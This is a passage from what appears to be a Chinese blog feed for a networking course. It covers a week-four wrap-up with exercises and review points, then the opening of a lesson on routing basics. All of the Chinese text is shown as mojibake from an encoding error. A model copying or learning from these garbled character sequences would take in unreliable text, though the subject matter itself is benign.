âœ… åˆ†æç½‘ç»œé—®é¢˜<br>   âœ… æå‡ºè§£å†³æ–¹æ¡ˆ<br><br><span class="hljs-bullet">5.</span> ä¼˜åŒ–èƒ½åŠ›<br>   âœ… æ€§èƒ½åˆ†æ<br>   âœ… å‚æ•°è°ƒä¼˜<br>   âœ… ç½‘ç»œè®¾è®¡<br></code></pre></td></tr></table></figure><h3 id="6-3-ä¸‹å‘¨é¢„å‘Š"><a href="#6-3-ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="6.3 ä¸‹å‘¨é¢„å‘Š"></a>6.3 ä¸‹å‘¨é¢„å‘Š</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç¬¬äº”å‘¨ï¼šç½‘ç»œå®‰å…¨åŸºç¡€ï¼ˆDay 28-35ï¼‰<br><br>ä¸»è¦å†…å®¹ï¼š<br><span class="hljs-bullet">- </span>ç½‘ç»œå®‰å…¨æ¦‚è¿°<br><span class="hljs-bullet">- </span>é˜²ç«å¢™æŠ€æœ¯<br><span class="hljs-bullet">- </span>VPNå’Œéš§é“<br><span class="hljs-bullet">- </span>å…¥ä¾µæ£€æµ‹<br><span class="hljs-bullet">- </span>å®‰å…¨åè®®<br><span class="hljs-bullet">- </span>æ¸—é€æµ‹è¯•åŸºç¡€<br><span class="hljs-bullet">- </span>å®‰å…¨åŠ å›º<br><br>å­¦ä¹ ç›®æ ‡ï¼š<br><span class="hljs-bullet">- </span>ç†è§£ç½‘ç»œå®‰å…¨å¨èƒ<br><span class="hljs-bullet">- </span>æŒæ¡é˜²æŠ¤æŠ€æœ¯<br><span class="hljs-bullet">- </span>å­¦ä¹ å®‰å…¨å·¥å…·<br><span class="hljs-bullet">- </span>å®ç°å®‰å…¨é¡¹ç›®<br></code></pre></td></tr></table></figure><hr><h2 id="7-ä»Šæ—¥ç»ƒä¹ "><a href="#7-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="7. ä»Šæ—¥ç»ƒä¹ "></a>7. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šç»¼åˆè¯Šæ–­"><a href="#ç»ƒä¹ 1ï¼šç»¼åˆè¯Šæ–­" class="headerlink" title="ç»ƒä¹ 1ï¼šç»¼åˆè¯Šæ–­"></a>ç»ƒä¹ 1ï¼šç»¼åˆè¯Šæ–­</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä»»åŠ¡ï¼šè¯Šæ–­ç½‘ç»œè¿æ¥é—®é¢˜<br><br>åœºæ™¯ï¼š<br>æŸå°ç”µè„‘æ— æ³•è®¿é—®äº’è”ç½‘<br><br>è¦æ±‚ï¼š<br><span class="hljs-bullet">1.</span> ä½¿ç”¨ç³»ç»ŸåŒ–çš„æ–¹æ³•æ’æŸ¥<br><span class="hljs-bullet">2.</span> è®°å½•æ¯ä¸ªæ­¥éª¤çš„ç»“æœ<br><span class="hljs-bullet">3.</span> æ‰¾å‡ºé—®é¢˜åŸå› <br><span class="hljs-bullet">4.</span> æå‡ºè§£å†³æ–¹æ¡ˆ<br><span class="hljs-bullet">5.</span> éªŒè¯è§£å†³æ•ˆæœ<br><br>æäº¤ï¼š<br><span class="hljs-bullet">-</span> è¯Šæ–­è¿‡ç¨‹æ–‡æ¡£<br><span class="hljs-bullet">-</span> é—®é¢˜åˆ†ææŠ¥å‘Š<br><span class="hljs-bullet">-</span> è§£å†³æ–¹æ¡ˆè¯´æ˜<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šæ€§èƒ½ä¼˜åŒ–"><a href="#ç»ƒä¹ 2ï¼šæ€§èƒ½ä¼˜åŒ–" class="headerlink" title="ç»ƒä¹ 2ï¼šæ€§èƒ½ä¼˜åŒ–"></a>ç»ƒä¹ 2ï¼šæ€§èƒ½ä¼˜åŒ–</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä»»åŠ¡ï¼šä¼˜åŒ–LinuxæœåŠ¡å™¨ç½‘ç»œæ€§èƒ½<br><br>è¦æ±‚ï¼š<br><span class="hljs-bullet">1.</span> æµ‹è¯•å½“å‰æ€§èƒ½åŸºçº¿<br><span class="hljs-bullet">2.</span> åº”ç”¨ä¼˜åŒ–é…ç½®<br><span class="hljs-bullet">3.</span> é‡æ–°æµ‹è¯•æ€§èƒ½<br><span class="hljs-bullet">4.</span> å¯¹æ¯”ä¼˜åŒ–æ•ˆæœ<br><span class="hljs-bullet">5.</span> åˆ†ææå‡åŸå› <br><br>æµ‹è¯•é¡¹ç›®ï¼š<br><span class="hljs-bullet">-</span> TCPè¿æ¥å»ºç«‹é€Ÿåº¦<br><span class="hljs-bullet">-</span> å¹¶å‘è¿æ¥æ•°<br><span class="hljs-bullet">-</span> ååé‡<br><span class="hljs-bullet">-</span> å»¶è¿Ÿ<br><br>æäº¤ï¼š<br><span class="hljs-bullet">-</span> ä¼˜åŒ–å‰åå¯¹æ¯”æ•°æ®<br><span class="hljs-bullet">-</span> ä¼˜åŒ–é…ç½®æ–‡ä»¶<br><span class="hljs-bullet">-</span> æ€§èƒ½åˆ†ææŠ¥å‘Š<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šå®æˆ˜é¡¹ç›®"><a href="#ç»ƒä¹ 3ï¼šå®æˆ˜é¡¹ç›®" class="headerlink" title="ç»ƒä¹ 3ï¼šå®æˆ˜é¡¹ç›®"></a>ç»ƒä¹ 3ï¼šå®æˆ˜é¡¹ç›®</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä»»åŠ¡ï¼šå®ç°ç½‘ç»œè¯Šæ–­è„šæœ¬<br><br>è¦æ±‚ï¼š<br><span class="hljs-bullet">1.</span> æ•´åˆæœ¬å‘¨æ‰€å­¦å·¥å…·<br><span class="hljs-bullet">2.</span> å®ç°è‡ªåŠ¨è¯Šæ–­åŠŸèƒ½<br><span class="hljs-bullet">3.</span> ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š<br><span class="hljs-bullet">4.</span> æä¾›è§£å†³å»ºè®®<br><br>åŠŸèƒ½ï¼š<br><span class="hljs-bullet">-</span> åŸºç¡€è¿é€šæ€§æµ‹è¯•<br><span class="hljs-bullet">-</span> DNSæµ‹è¯•<br><span class="hljs-bullet">-</span> è·¯å¾„è¿½è¸ª<br><span class="hljs-bullet">-</span> æ€§èƒ½æµ‹è¯•<br><span class="hljs-bullet">-</span> é—®é¢˜è¯Šæ–­<br><br>æäº¤ï¼š<br><span class="hljs-bullet">-</span> å®Œæ•´ä»£ç <br><span class="hljs-bullet">-</span> ä½¿ç”¨æ–‡æ¡£<br><span class="hljs-bullet">-</span> æµ‹è¯•ç»“æœ<br></code></pre></td></tr></table></figure><hr><h2 id="8-å­¦ä¹ å»ºè®®"><a href="#8-å­¦ä¹ å»ºè®®" class="headerlink" title="8. å­¦ä¹ å»ºè®®"></a>8. å­¦ä¹ å»ºè®®</h2><h3 id="8-1-å¤ä¹ é‡ç‚¹"><a href="#8-1-å¤ä¹ é‡ç‚¹" class="headerlink" title="8.1 å¤ä¹ é‡ç‚¹"></a>8.1 å¤ä¹ é‡ç‚¹</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¿…é¡»æŒæ¡ï¼š<br><span class="hljs-bullet">1.</span> IPåœ°å€å’Œå­ç½‘åˆ’åˆ†<br><span class="hljs-bullet">   -</span> ç†Ÿç»ƒè®¡ç®—å­ç½‘<br><span class="hljs-bullet">   -</span> ç†è§£CIDRå’ŒVLSM<br><br><span class="hljs-bullet">2.</span> è·¯ç”±åŸç†<br><span class="hljs-bullet">   -</span> æœ€é•¿å‰ç¼€åŒ¹é…<br><span class="hljs-bullet">   -</span> è·¯ç”±è¡¨æŸ¥æ‰¾<br><span class="hljs-bullet">   -</span> é™æ€å’ŒåŠ¨æ€è·¯ç”±<br><br><span class="hljs-bullet">3.</span> ARPåè®®<br><span class="hljs-bullet">   -</span> åœ°å€è§£æè¿‡ç¨‹<br><span class="hljs-bullet">   -</span> ARPç¼“å­˜ç®¡ç†<br><span class="hljs-bullet">   -</span> å®‰å…¨é—®é¢˜<br><br><span class="hljs-bullet">4.</span> ç½‘ç»œè¯Šæ–­<br><span class="hljs-bullet">   -</span> pingå’Œtraceroute<br><span class="hljs-bullet">   -</span> ç³»ç»ŸåŒ–æ’é”™æ–¹æ³•<br><span class="hljs-bullet">   -</span> å·¥å…·ä½¿ç”¨<br><br>é‡ç‚¹ç»ƒä¹ ï¼š<br><span class="hljs-bullet">-</span> å­ç½‘åˆ’åˆ†é¢˜ç›®<br><span class="hljs-bullet">-</span> è·¯ç”±æŸ¥æ‰¾ç»ƒä¹ <br><span class="hljs-bullet">-</span> å®é™…æ’é”™æ“ä½œ<br><span class="hljs-bullet">-</span> ç¼–å†™è¯Šæ–­è„šæœ¬<br></code></pre></td></tr></table></figure><h3 id="8-2-æ‰©å±•å­¦ä¹ "><a href="#8-2-æ‰©å±•å­¦ä¹ " class="headerlink" title="8.2 æ‰©å±•å­¦ä¹ "></a>8.2 æ‰©å±•å­¦ä¹ </h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ·±å…¥å­¦ä¹ ï¼š<br><span class="hljs-bullet">1.</span> é˜…è¯»RFCæ–‡æ¡£<br><span class="hljs-bullet">   -</span> RFC 791: IP<br><span class="hljs-bullet">   -</span> RFC 792: ICMP<br><span class="hljs-bullet">   -</span> RFC 826: ARP<br><span class="hljs-bullet">   -</span> RFC 2453: RIP<br><span class="hljs-bullet">   -</span> RFC 2328: OSPF<br><br><span class="hljs-bullet">2.</span> ç½‘ç»œæ¨¡æ‹Ÿ<br><span class="hljs-bullet">   -</span> GNS3<br><span class="hljs-bullet">   -</span> Packet Tracer<br><span class="hljs-bullet">   -</span> EVE-NG<br><br><span class="hljs-bullet">3.</span> æŠ“åŒ…åˆ†æ<br><span class="hljs-bullet">   -</span> Wiresharkæ·±åº¦ä½¿ç”¨<br><span class="hljs-bullet">   -</span> åè®®åˆ†æ<br><span class="hljs-bullet">   -</span> æµé‡åˆ†æ<br><br><span class="hljs-bullet">4.</span> ç½‘ç»œç¼–ç¨‹<br><span class="hljs-bullet">   -</span> å¥—æ¥å­—ç¼–ç¨‹<br><span class="hljs-bullet">   -</span> åè®®å®ç°<br><span class="hljs-bullet">   -</span> å·¥å…·å¼€å‘<br><br><span class="hljs-bullet">5.</span> ç½‘ç»œå®‰å…¨<br><span class="hljs-bullet">   -</span> å¸¸è§æ”»å‡»<br><span class="hljs-bullet">   -</span> é˜²å¾¡æŠ€æœ¯<br><span class="hljs-bullet">   -</span> æ¸—é€æµ‹è¯•<br></code></pre></td></tr></table></figure><hr><h2 id="9-æ€è€ƒé¢˜"><a href="#9-æ€è€ƒé¢˜" class="headerlink" title="9. æ€è€ƒé¢˜"></a>9. æ€è€ƒé¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆéœ€è¦IPv6ï¼ŸIPv4åœ°å€ä¸å¤Ÿç”¨å¦‚ä½•ä¸´æ—¶è§£å†³ï¼Ÿ</strong></p><p>æ€è€ƒæ–¹å‘ï¼š</p><ul><li>IPv4åœ°å€ç©ºé—´é™åˆ¶</li><li>NATçš„ä½œç”¨å’Œå±€é™</li><li>IPv6çš„å¿…è¦æ€§</li><li>è¿‡æ¸¡æ–¹æ¡ˆ</li></ul><p><strong>Q2ï¼šå¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å¯ç”¨çš„ç½‘ç»œæ¶æ„ï¼Ÿ</strong></p><p>æ€è€ƒæ–¹å‘ï¼š</p><ul><li>å†—ä½™è®¾è®¡</li><li>æ•…éšœåˆ‡æ¢</li><li>è´Ÿè½½å‡è¡¡</li><li>ç›‘æ§å‘Šè­¦</li></ul><p><strong>Q3ï¼šé‡åˆ°ç½‘ç»œæ•…éšœï¼Œåº”è¯¥å¦‚ä½•ç³»ç»ŸåŒ–æ’æŸ¥ï¼Ÿ</strong></p><p>æ€è€ƒæ–¹å‘ï¼š</p><ul><li>åˆ†å±‚æ’æŸ¥ï¼ˆç‰©ç†â†’é“¾è·¯â†’ç½‘ç»œâ†’ä¼ è¾“â†’åº”ç”¨ï¼‰</li><li>ç”±è¿‘åŠè¿œï¼ˆæœ¬æœºâ†’ç½‘å…³â†’å¤–ç½‘ï¼‰</li><li>ä½¿ç”¨åˆé€‚å·¥å…·</li><li>è®°å½•è¿‡ç¨‹</li></ul><hr><h2 id="10-æ€»ç»“"><a href="#10-æ€»ç»“" class="headerlink" title="10. æ€»ç»“"></a>10. æ€»ç»“</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ç¬¬å››å‘¨å­¦ä¹ è·¯å¾„ï¼š<br><br>ç‰©ç†å±‚ â†’ é“¾è·¯å±‚ â†’ ç½‘ç»œå±‚<br>         â†“         â†“<br>       ARP      <span class="hljs-built_in">IP</span>/ICMP<br>                   â†“<br>                è·¯ç”±åè®®<br>                   â†“<br>              ç»¼åˆåº”ç”¨<br><br>æ ¸å¿ƒèƒ½åŠ›ï¼š<br>âœ… åè®®ç†è§£<br>âœ… å·¥å…·ä½¿ç”¨<br>âœ… ç¼–ç¨‹å®ç°<br>âœ… é—®é¢˜è¯Šæ–­<br>âœ… æ€§èƒ½ä¼˜åŒ–<br><br>å­¦ä¹ å¿ƒå¾—ï¼š<br>ç½‘ç»œå±‚æ˜¯TCP/<span class="hljs-built_in">IP</span>æ ¸å¿ƒï¼Œç†è§£äº†ç½‘ç»œå±‚ï¼Œ<br>å°±ç†è§£äº†äº’è”ç½‘çš„å·¥ä½œåŸç†ã€‚<br><br>ä»<span class="hljs-built_in">IP</span>å¯»å€åˆ°è·¯ç”±è½¬å‘ï¼Œä»ARPè§£æåˆ°ICMPè¯Šæ–­ï¼Œ<br>æ¯ä¸ªåè®®éƒ½æœ‰å…¶ç‹¬ç‰¹ä½œç”¨ï¼Œåˆç›¸äº’é…åˆã€‚<br><br>ç†è®ºè¦ç»“åˆå®è·µï¼Œé€šè¿‡ç¼–ç¨‹å®ç°å’Œå®é™…æ“ä½œï¼Œ<br>æ‰èƒ½çœŸæ­£æŒæ¡è¿™äº›çŸ¥è¯†ã€‚<br><br>ç»§ç»­åŠ æ²¹ï¼ä¸‹å‘¨æˆ‘ä»¬å°†å­¦ä¹ ç½‘ç»œå®‰å…¨ï¼<br></code></pre></td></tr></table></figure><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p><strong>è¿›åº¦ï¼š27&#x2F;180å¤©ï¼ˆ15.0%ï¼‰</strong></p><p>æ­å–œå®Œæˆç¬¬å››å‘¨å­¦ä¹ ï¼ä½ å·²ç»æŒæ¡äº†ç½‘ç»œå±‚çš„æ ¸å¿ƒçŸ¥è¯†ï¼Œå»ºç«‹äº†å®Œæ•´çš„ç½‘ç»œåè®®ä½“ç³»ã€‚ä¸‹å‘¨æˆ‘ä»¬å°†è¿›å…¥æ¿€åŠ¨äººå¿ƒçš„ç½‘ç»œå®‰å…¨é¢†åŸŸï¼Œå­¦ä¹ å¦‚ä½•ä¿æŠ¤ç½‘ç»œå…å—æ”»å‡»ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>26å¤©ï¼šè·¯ç”±åè®®åŸºç¡€</title>
    <link href="/2025/11/10/26%E5%A4%A9%EF%BC%9A%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/26%E5%A4%A9%EF%BC%9A%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬26å¤©ï¼šè·¯ç”±åè®®åŸºç¡€"><a href="#ç¬¬26å¤©ï¼šè·¯ç”±åè®®åŸºç¡€" class="headerlink" title="ç¬¬26å¤©ï¼šè·¯ç”±åè®®åŸºç¡€"></a>ç¬¬26å¤©ï¼šè·¯ç”±åè®®åŸºç¡€</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£è·¯ç”±çš„åŸºæœ¬æ¦‚å¿µ</li><li>æŒæ¡è·¯ç”±è¡¨çš„ç»“æ„å’ŒæŸ¥æ‰¾è¿‡ç¨‹</li><li>å­¦ä¹ é™æ€è·¯ç”±é…ç½®</li><li>ç†è§£åŠ¨æ€è·¯ç”±åè®®çš„åˆ†ç±»</li><li>æ·±å…¥å­¦ä¹ RIPåè®®</li><li>äº†è§£OSPFåè®®åŸºç¡€</li><li>å®ç°è·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨</li></ul><hr><h2 id="1-è·¯ç”±åŸºç¡€æ¦‚å¿µ"><a href="#1-è·¯ç”±åŸºç¡€æ¦‚å¿µ" class="headerlink" title="1. è·¯ç”±åŸºç¡€æ¦‚å¿µ"></a>1. è·¯ç”±åŸºç¡€æ¦‚å¿µ</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯è·¯ç”±ï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯è·¯ç”±ï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯è·¯ç”±ï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯è·¯ç”±ï¼Ÿ</h3><p><strong>è·¯ç”± &#x3D; Routing</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è·¯ç”±çš„å®šä¹‰ï¼š<br>ç¡®å®šæ•°æ®åŒ…ä»æºåˆ°ç›®çš„åœ°çš„ä¼ è¾“è·¯å¾„<br><br>ç”Ÿæ´»æ¯”å–»ï¼š<br>è·¯ç”±å°±åƒå¯¼èˆªç³»ç»Ÿ<br><br>åœºæ™¯ï¼šä½ è¦ä»åŒ—äº¬åˆ°ä¸Šæµ·<br><span class="hljs-bullet">-</span> å¯ä»¥åé£æœºï¼ˆå¿«ï¼Œè´µï¼‰<br><span class="hljs-bullet">-</span> å¯ä»¥åé«˜é“ï¼ˆè¾ƒå¿«ï¼Œé€‚ä¸­ï¼‰<br><span class="hljs-bullet">-</span> å¯ä»¥å¼€è½¦ï¼ˆçµæ´»ï¼Œæ…¢ï¼‰<br><br>è·¯ç”±å™¨å°±æ˜¯&quot;å¯¼èˆª&quot;ï¼š<br><span class="hljs-bullet">-</span> åˆ†æç›®çš„åœ°<br><span class="hljs-bullet">-</span> é€‰æ‹©æœ€ä½³è·¯å¾„<br><span class="hljs-bullet">-</span> æŒ‡å¼•æ•°æ®åŒ…å‰è¿›<br><br>å…³é”®é—®é¢˜ï¼š<br><span class="hljs-bullet">1.</span> å»å“ªé‡Œï¼Ÿâ†’ ç›®æ ‡ç½‘ç»œ<br><span class="hljs-bullet">2.</span> æ€ä¹ˆèµ°ï¼Ÿâ†’ ä¸‹ä¸€è·³<br><span class="hljs-bullet">3.</span> æœ‰å‡ æ¡è·¯ï¼Ÿâ†’ å¤šæ¡è·¯å¾„<br><span class="hljs-bullet">4.</span> å“ªæ¡æœ€å¥½ï¼Ÿâ†’ è·¯ç”±åº¦é‡<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±å™¨çš„ä½œç”¨</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è·¯ç”±å™¨ = Router<br><br>åŠŸèƒ½ï¼š<br><span class="hljs-bullet">1.</span> è·¯å¾„é€‰æ‹©<br><span class="hljs-bullet">   -</span> æ ¹æ®è·¯ç”±è¡¨é€‰æ‹©æœ€ä½³è·¯å¾„<br><span class="hljs-bullet">   -</span> è½¬å‘æ•°æ®åŒ…<br><br><span class="hljs-bullet">2.</span> è¿æ¥ä¸åŒç½‘ç»œ<br><span class="hljs-bullet">   -</span> è¿æ¥å¤šä¸ªå­ç½‘<br><span class="hljs-bullet">   -</span> éš”ç¦»å¹¿æ’­åŸŸ<br><br><span class="hljs-bullet">3.</span> æµé‡æ§åˆ¶<br><span class="hljs-bullet">   -</span> QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰<br><span class="hljs-bullet">   -</span> æµé‡æ•´å½¢<br><br><span class="hljs-bullet">4.</span> å®‰å…¨é˜²æŠ¤<br><span class="hljs-bullet">   -</span> è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰<br><span class="hljs-bullet">   -</span> é˜²ç«å¢™åŠŸèƒ½<br><br>å·¥ä½œè¿‡ç¨‹ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚         è·¯ç”±å™¨å·¥ä½œæµç¨‹               â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ 1. æ¥æ”¶æ•°æ®åŒ…                        â”‚<br>â”‚ 2. æ£€æŸ¥ç›®æ ‡IPåœ°å€                    â”‚<br>â”‚ 3. æŸ¥æ‰¾è·¯ç”±è¡¨                        â”‚<br>â”‚ 4. ç¡®å®šå‡ºå£æ¥å£å’Œä¸‹ä¸€è·³              â”‚<br>â”‚ 5. ä¿®æ”¹ä»¥å¤ªç½‘å¤´éƒ¨ï¼ˆæº/ç›®æ ‡MACï¼‰      â”‚<br>â”‚ 6. TTLå‡1                            â”‚<br>â”‚ 7. é‡æ–°è®¡ç®—æ ¡éªŒå’Œ                    â”‚<br>â”‚ 8. è½¬å‘æ•°æ®åŒ…                        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç¤ºä¾‹ï¼š<br>ç½‘ç»œA: 192.168.1.0/24<br>   â†“<br>è·¯ç”±å™¨R1<br>   â†“<br>ç½‘ç»œB: 192.168.2.0/24<br><br>ä¸»æœºA (192.168.1.10) â†’ ä¸»æœºB (192.168.2.20)<br><span class="hljs-bullet">1.</span> Aå‘é€æ•°æ®åŒ…ï¼Œç›®æ ‡IP: 192.168.2.20<br><span class="hljs-bullet">2.</span> Aå‘ç°ç›®æ ‡ä¸åœ¨æœ¬åœ°ç½‘ç»œ<br><span class="hljs-bullet">3.</span> Aå‘é€ç»™é»˜è®¤ç½‘å…³ï¼ˆè·¯ç”±å™¨R1ï¼‰<br><span class="hljs-bullet">4.</span> R1æ¥æ”¶ï¼ŒæŸ¥è·¯ç”±è¡¨<br><span class="hljs-bullet">5.</span> R1ç¡®å®šä»æ¥å£2è½¬å‘<br><span class="hljs-bullet">6.</span> R1ä¿®æ”¹ä»¥å¤ªç½‘å¤´éƒ¨ï¼Œè½¬å‘åˆ°ç½‘ç»œB<br><span class="hljs-bullet">7.</span> ä¸»æœºBæ¥æ”¶<br></code></pre></td></tr></table></figure><h3 id="1-2-è·¯ç”±vsäº¤æ¢"><a href="#1-2-è·¯ç”±vsäº¤æ¢" class="headerlink" title="1.2 è·¯ç”±vsäº¤æ¢"></a>1.2 è·¯ç”±vsäº¤æ¢</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">è·¯ç”±ï¼ˆRoutingï¼‰vs 